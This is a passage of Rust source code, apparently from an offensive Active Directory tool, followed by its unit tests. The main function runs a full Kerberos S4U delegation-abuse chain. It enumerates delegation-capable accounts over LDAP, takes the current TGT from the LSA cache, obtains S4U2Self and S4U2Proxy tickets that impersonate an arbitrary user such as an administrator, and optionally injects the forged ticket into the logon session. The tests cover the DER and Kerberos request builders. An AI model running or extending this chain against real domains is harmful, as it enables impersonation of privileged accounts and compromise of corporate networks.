        target_spn: target_spn.to_string(),
        tgs_rep_bytes: tgs_rep,
        ticket_bytes,
        status: "S4U2Proxy ticket obtained".to_string(),
    })
}

/// Execute the full S4U abuse chain: discover delegation → S4U2Self → S4U2Proxy.
///
/// **Parameters**:
/// - `impersonate_user`: The username to impersonate (sAMAccountName)
/// - `target_spn`: The backend service SPN to get a ticket for
///   (must be in the service account's `msDS-AllowedToDelegateTo`).
///   If `None`, only S4U2Self is performed.
/// - `submit_to_session`: Whether to submit the final ticket to the
///   current LSA logon session.
///
/// **Returns**: The full abuse result with both S4U2Self and optional
/// S4U2Proxy ticket details.
pub fn impersonate_user_via_s4u(
    impersonate_user: &str,
    target_spn: Option<&str>,
    submit_to_session: bool,
) -> Result<S4uAbuseResult> {
    // Step 1: Discover DC
    let dc_hostname = discover_dc()?;

    // Step 2: Connect to LDAP
    let ldap = LdapConnection::connect(&dc_hostname)?;
    let realm = ldap.get_realm()?;

    // Step 3: Find delegation accounts
    let base_dn = ldap.get_default_naming_context()?;
    let accounts = ldap.find_delegation_accounts(&base_dn)?;

    if accounts.is_empty() {
        bail!("No delegation-capable accounts found in the domain");
    }

    // Step 4: Select an account with protocol transition
    let account = accounts
        .iter()
        .find(|a| a.protocol_transition)
        .or_else(|| {
            // Fall back to any account with delegation configured
            accounts.iter().find(|a| !a.allowed_to_delegate_to.is_empty())
        })
        .ok_or_else(|| anyhow!("No suitable delegation account found"))?;

    info!(
        "Using delegation account: {} (DN: {}, protocol_transition: {})",
        account.sam_account_name, account.dn, account.protocol_transition
    );

    // Step 5: Determine the service SPN
    let service_spn = account
        .spns
        .first()
        .cloned()
        .unwrap_or_else(|| format!("host/{}", account.sam_account_name));

    // Step 6: Get the realm for the impersonated user (same domain for now)
    let impersonate_realm = realm.clone();

    // Step 7: Retrieve TGT from the LSA Kerberos cache and build S4U2Self TGS-REQ
    let tgt_bytes = retrieve_tgt_from_lsa().map_err(|e| {
        warn!("Failed to retrieve TGT from LSA cache: {} — S4U2Self will likely be rejected by KDC", e);
        e
    })?;

    let s4u2self = request_s4u2self(
        &service_spn,
        &realm,
        impersonate_user,
        &impersonate_realm,
        &tgt_bytes,
    )?;

    // Step 8: S4U2Proxy (if target SPN specified)
    let s4u2proxy = if let Some(target) = target_spn {
        // Verify target is in the account's delegation list
        if !account.allowed_to_delegate_to.is_empty()
            && !account.allowed_to_delegate_to.iter().any(|s| {
                s.eq_ignore_ascii_case(target)
            })
        {
            warn!(
                "Target SPN {} is not in {}'s AllowedToDelegateTo list — KDC may reject",
                target, account.sam_account_name
            );
        }

        let mut result = request_s4u2proxy(
            target,
            &realm,
            &s4u2self.ticket_bytes,
            &s4u2self.tgs_rep_bytes,
        )?;
        result.impersonated_user = impersonate_user.to_string();
        Some(result)
    } else {
        None
    };

    // Step 9: Optionally submit ticket to session
    let ticket_applied = if submit_to_session {
        let ticket = s4u2proxy
            .as_ref()
            .map(|p| p.ticket_bytes.as_slice())
            .unwrap_or(&s4u2self.ticket_bytes);

        match submit_ticket_to_session(ticket) {
            Ok(()) => true,
            Err(e) => {
                warn!("Failed to submit ticket to session: {}", e);
                false
            }
        }
    } else {
        false
    };

    Ok(S4uAbuseResult {
        delegation_account: account.clone(),
        s4u2self,
        s4u2proxy,
        ticket_applied,
        status: "S4U abuse chain completed".to_string(),
    })
}

// ── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_der_length_short() {
        assert_eq!(der_length(0), vec![0x00]);
        assert_eq!(der_length(5), vec![0x05]);
        assert_eq!(der_length(127), vec![0x7F]);
    }

    #[test]
    fn test_der_length_two_byte() {
        assert_eq!(der_length(128), vec![0x81, 0x80]);
        assert_eq!(der_length(255), vec![0x81, 0xFF]);
    }

    #[test]
    fn test_der_length_three_byte() {
        assert_eq!(der_length(256), vec![0x82, 0x01, 0x00]);
        assert_eq!(der_length(1024), vec![0x82, 0x04, 0x00]);
    }

    #[test]
    fn test_der_integer_zero() {
        let encoded = der_integer(0);
        assert_eq!(encoded[0], ASN1_INTEGER);
        // Length should be 1, value should be 0
        assert_eq!(&encoded[1..], &[0x01, 0x00]);
    }

    #[test]
    fn test_der_integer_positive() {
        let encoded = der_integer(5);
        assert_eq!(encoded[0], ASN1_INTEGER);
        assert_eq!(&encoded[1..], &[0x01, 0x05]);
    }

    #[test]
    fn test_der_integer_large() {
        let encoded = der_integer(256);
        assert_eq!(encoded[0], ASN1_INTEGER);
        assert_eq!(&encoded[1..], &[0x02, 0x01, 0x00]);
    }

    #[test]
    fn test_der_general_string() {
        let encoded = der_general_string("TEST");
        assert_eq!(encoded[0], ASN1_GENERAL_STRING);
        assert_eq!(&encoded[1..], &[0x04, b'T', b'E', b'S', b'T']);
    }

    #[test]
    fn test_der_sequence() {
        let inner = der_integer(1);
        let seq = der_sequence(&inner);
        assert_eq!(seq[0], ASN1_SEQUENCE);
        // Should contain the integer encoding after tag + length
        assert_eq!(&seq[2..], &inner[..]);
    }

    #[test]
    fn test_der_octet_string() {
        let encoded = der_octet_string(&[0xDE, 0xAD, 0xBE, 0xEF]);
        assert_eq!(encoded[0], ASN1_OCTET_STRING);
        assert_eq!(&encoded[1..], &[0x04, 0xDE, 0xAD, 0xBE, 0xEF]);
    }

    #[test]
    fn test_der_bit_string() {
        let encoded = der_bit_string(&[0xFF]);
        assert_eq!(encoded[0], ASN1_BIT_STRING);
        // Length = 2 (1 unused-bits byte + 1 data byte)
        assert_eq!(&encoded[1..], &[0x02, 0x00, 0xFF]);
    }

    #[test]
    fn test_der_context_explicit() {
        let inner = der_integer(42);
        let tagged = der_context_explicit(3, &inner);
        assert_eq!(tagged[0], 0xA3); // context [3]
        // Should contain the integer encoding after tag + length
        assert_eq!(&tagged[2..], &inner[..]);
    }

    #[test]
    fn test_build_principal_name() {
        let pn = build_principal_name(KRB_NT_PRINCIPAL, &["admin"]);
        // Should start with SEQUENCE tag
        assert_eq!(pn[0], ASN1_SEQUENCE);
        // Should contain "admin" as GeneralString
        let admin_bytes = b"admin";
        assert!(pn.windows(admin_bytes.len()).any(|w| w == admin_bytes));
    }

    #[test]
    fn test_build_principal_name_srv_inst() {
        let pn = build_principal_name(KRB_NT_SRV_INST, &["cifs", "server.corp.com"]);
        assert_eq!(pn[0], ASN1_SEQUENCE);
        // Should contain both "cifs" and "server.corp.com"
        assert!(pn.windows(4).any(|w| w == b"cifs"));
        assert!(pn.windows(8).any(|w| w.starts_with(b"server.")));
    }

    #[test]
    fn test_build_kdc_options() {
        let opts = build_kdc_options(KDC_OPT_FORWARDABLE);
        assert_eq!(opts[0], ASN1_BIT_STRING);
        // 5 bytes of flags + 1 unused-bits byte
        assert_eq!(opts[1], 6); // length = 6
        assert_eq!(opts[2], 0); // 0 unused bits
        // Forwardable = 0x40000000 → first byte is 0x40
        assert_eq!(opts[3], 0x40);
    }

    #[test]
    fn test_format_kerberos_time() {
        // 2024-01-01 00:00:00 UTC = 1704067200 seconds since epoch
        let ts = format_kerberos_time(1704067200);
        assert!(ts.starts_with("2024"));
        assert!(ts.ends_with('Z'));
        assert_eq!(ts.len(), 15); // YYYYMMDDHHMMSSZ
    }

    #[test]
    fn test_build_pa_data() {
        let pa = build_pa_data(PA_FOR_USER, &[0x01, 0x02, 0x03]);
        assert_eq!(pa[0], ASN1_SEQUENCE);
        // Should contain the PA-DATA type (129) as context [1]
        assert!(pa.iter().any(|&b| b == ASN1_CONTEXT_1));
    }

    #[test]
    fn test_build_pa_for_user() {
        let pfu = build_pa_for_user("admin", "CORP.CONTOSO.COM");
        // Should be a SEQUENCE containing the four elements
        assert_eq!(pfu[0], ASN1_SEQUENCE);
        // Should contain "admin" and "CORP.CONTOSO.COM" and "Kerberos"
        assert!(pfu.windows(5).any(|w| w == b"admin"));
        assert!(pfu.windows(8).any(|w| w.starts_with(b"CORP.CO")));
        assert!(pfu.windows(8).any(|w| w == b"Kerberos"));
    }

    #[test]
    fn test_build_s4u2self_tgs_req() {
        let req = build_s4u2self_tgs_req(
            "cifs/dc01.corp.com",
            "CORP.COM",
            "administrator",
            "CORP.COM",
            &[0u8; 16], // dummy TGT
        );
        // Should start with APPLICATION 12 tag
        assert_eq!(req[0], ASN1_APPLICATION_12);
        // Should be non-trivial in size
        assert!(req.len() > 50);
    }

    #[test]
    fn test_build_s4u2proxy_tgs_req() {
        let req = build_s4u2proxy_tgs_req(
            "cifs/fileserver.corp.com",
            "CORP.COM",
            &[0u8; 32], // dummy S4U2Self ticket
            &[0u8; 64], // dummy S4U2Self TGS-REP
        );
        // Should start with APPLICATION 12 tag
        assert_eq!(req[0], ASN1_APPLICATION_12);
        assert!(req.len() > 50);
    }

    #[test]
    fn test_parse_krb_error_valid() {
        // Build a minimal KRB-ERROR:
        // APPLICATION 30 (0x7E) SEQUENCE { INTEGER pvno, INTEGER msg-type, ...,
        //   INTEGER cusec, INTEGER susec, INTEGER error-code }
        let mut error_data = vec![
            0x7E, // APPLICATION 30
            0x20, // length (placeholder)
            ASN1_SEQUENCE,
            0x1E, // inner length
        ];
        // pvno = 5
        error_data.extend_from_slice(&[ASN1_INTEGER, 0x01, 0x05]);
        // msg-type = 30
        error_data.extend_from_slice(&[ASN1_INTEGER, 0x01, 0x1E]);
        // ctime (skip - use string instead, but for test we'll put integers)
        // cusec = 0
        error_data.extend_from_slice(&[ASN1_INTEGER, 0x01, 0x00]);
        // susec = 0
        error_data.extend_from_slice(&[ASN1_INTEGER, 0x01, 0x00]);
        // error-code = 0x18 (KDC_ERR_S_PRINCIPAL_UNKNOWN = 24)
        error_data.extend_from_slice(&[ASN1_INTEGER, 0x01, 0x18]);

        // Fix lengths
        error_data[1] = (error_data.len() - 2) as u8;
        error_data[3] = (error_data.len() - 4) as u8;

        let code = parse_krb_error(&error_data).unwrap();
        assert_eq!(code, 24);
    }

    #[test]
    fn test_parse_der_integer() {
        let data = vec![ASN1_INTEGER, 0x01, 0x2A]; // integer 42
        let (value, next) = parse_der_integer(&data, 0).unwrap();
        assert_eq!(value, 42);
        assert_eq!(next, 3);
    }

    #[test]
    fn test_skip_tag_length() {
        let data = vec![0x30, 0x05, 0x01, 0x02, 0x03, 0x04, 0x05]; // SEQUENCE of 5 bytes
        let pos = skip_tag_length(&data, 0).unwrap();
        assert_eq!(pos, 2); // past tag + length
    }

    #[test]
    fn test_random_nonce() {
        let n1 = random_nonce();
        let n2 = random_nonce();
        // Should not be zero
        assert_ne!(n1, 0);
        // Should be different on successive calls (with high probability)
        // This may fail in very rare timing edge cases, but is fine for a test
        assert_ne!(n1, n2);
    }

    #[test]
    fn test_days_to_ymd() {
        // 1970-01-01 = day 0
        assert_eq!(days_to_ymd(0), (1970, 1, 1));
        // 1970-01-02 = day 1
        assert_eq!(days_to_ymd(1), (1970, 1, 2));
        // 2000-01-01 = day 10957
        assert_eq!(days_to_ymd(10957), (2000, 1, 1));
    }

    #[test]
    fn test_is_leap_year() {
        assert!(!is_leap_year(1970));
        assert!(is_leap_year(1972));
        assert!(!is_leap_year(1900));
        assert!(is_leap_year(2000));
    }

    #[test]
    fn test_delegation_account_serialization() {
        let account = DelegationAccount {
            dn: "CN=svc_sql,CN=Computers,DC=corp,DC=com".to_string(),
            sam_account_name: "svc_sql$".to_string(),
            spns: vec!["MSSQLSvc/db01.corp.com:1433".to_string()],
            allowed_to_delegate_to: vec!["cifs/fileserver.corp.com".to_string()],
            protocol_transition: true,
        };

        let json = serde_json::to_string(&account).unwrap();
        assert!(json.contains("svc_sql"));
        assert!(json.contains("protocol_transition"));
        assert!(json.contains("cifs/fileserver"));
    }
}
